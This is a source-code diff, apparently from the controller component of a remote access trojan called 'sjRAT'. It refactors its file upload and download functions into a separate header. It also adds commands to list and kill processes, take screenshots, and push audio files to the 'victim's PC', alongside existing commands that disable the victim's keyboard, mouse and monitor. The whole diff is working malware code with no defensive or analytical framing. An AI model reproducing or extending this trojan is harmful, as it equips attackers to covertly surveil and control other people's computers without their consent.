@@ -1,4 +1,5 @@
 #include "includes.h"
+#include "UpDown.h"
 
 std::string GenerateRandomFilename()
 {
@@ -17,108 +18,6 @@ std::string GenerateRandomFilename()
     }
 
     return randomFilename;
-}
-
-void ReceiveFile(SOCKET client, const std::string& filename)
-{
-    std::ofstream file(filename, std::ios::binary);
-    if (!file)
-    {
-        printf("[!] Failed to create file: %s\n", filename.c_str());
-        return;
-    }
-
-    // Получаем размер файла от клиента
-    std::streampos fileSize;
-    int bytesReceived = recv(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-    if (bytesReceived <= 0)
-    {
-        printf("[!] Failed to receive file size\n");
-        file.close();
-        std::remove(filename.c_str()); // Удаляем созданный файл
-        return;
-    }
-
-    // Выделяем буфер для приема файла
-    char* buffer = new char[FILE_BUFF_SIZE];
-
-    // Принимаем файл по частям и записываем в файл
-    while (fileSize > 0)
-    {
-        // Получаем очередную часть файла
-        int bytesReceived = recv(client, buffer, FILE_BUFF_SIZE, 0);
-        if (bytesReceived <= 0)
-        {
-            printf("[!] Failed to receive file\n");
-            break;
-        }
-
-        // Записываем принятые данные в файл
-        file.write(buffer, bytesReceived);
-
-        // Уменьшаем оставшийся размер файла
-        fileSize -= bytesReceived;
-    }
-
-    // Освобождаем ресурсы
-    delete[] buffer;
-    file.close();
-
-    if (fileSize <= 0)
-    {
-        printf("[*] File received: %s\n", filename.c_str());
-    }
-    else
-    {
-        printf("[!] Failed to receive complete file: %s\n", filename.c_str());
-        std::remove(filename.c_str()); // Удаляем частично принятый файл
-    }
-}
-
-void SendFile(SOCKET client, char* filename) 
-{
-    std::ifstream file(filename, std::ios::binary);
-    if (!file) {
-        printf("[!] Failed to open file: %s\n", filename);
-        return;
-    }
-
-    // Получаем размер файла
-    file.seekg(0, std::ios::end);
-    std::streampos fileSize = file.tellg();
-    file.seekg(0, std::ios::beg);
-
-    // Выделяем буфер для чтения файла
-    char* buffer = new char[FILE_BUFF_SIZE];
-
-    // Отправляем клиенту размер файла
-    send(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-
-    // Читаем и отправляем файл по частям
-    while (fileSize > 0) {
-        // Читаем очередную часть файла
-        std::streamsize bytesRead = file.readsome(buffer, FILE_BUFF_SIZE);
-        if (bytesRead <= 0) {
-            printf("[!] Failed to read file: %s\n", filename);
-            break;
-        }
-
-        // Отправляем прочитанные данные клиенту
-        int bytesSent = send(client, buffer, bytesRead, 0);
-        if (bytesSent <= 0) {
-            printf("[!] Failed to send file: %s\n", filename);
-            break;
-        }
-
-        // Уменьшаем оставшийся размер файла
-        fileSize -= bytesSent;
-    }
-
-    // Освобождаем ресурсы
-    delete[] buffer;
-    file.close();
-
-    printf("[*] File sent: %s\n", filename);
 }
 
 void SendAndReceive(SOCKET client, std::string command)
@@ -146,6 +45,9 @@ void help_menu()
     printf("monitor off/on - turn off/on victim's monitor\n\n");
     printf("keyboard off/on - disable/enable keyboard\n\n");
     printf("mouse off/on - disable/enable mouse\n\n");
+    printf("pids - get all process running on victim's PC\n\n");
+    printf("kill <pid> - kill process on victim's PC\n\n");
+    printf("screenshot - take screenshot from victim's PC\n\n");
     printf("play <file> - play music from file\n\n");
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
@@ -342,6 +244,24 @@ int main(int argc, char* argv[])
                 if ((int)hInstance <= 32)
                 {
                     printf("[*] Failed to open %s\n", filename);
+                }
+            }
+            else if (command.substr(0, 4) == "play") {
+
+                // if (command.length() > 6) {
+                //     std::string filename = command.substr(7);
+                //     SendAndReceive(client, command);
+                //     SendFile(client, &filename[0]);
+                // } else {
+                //     printf("[!] Usage: upload <filename>\n");
+                // }
+
+                if (command.length() > 4) {
+                    std::string file = command.substr(5);
+                    SendAndReceive(client, command); // send `send sound.mp3s` command                    
+                    SendFile(client, file.c_str()); // sendinf file to client
+                } else {
+                    printf("[!] Usage: play <file>\n");
                 }
             }
 
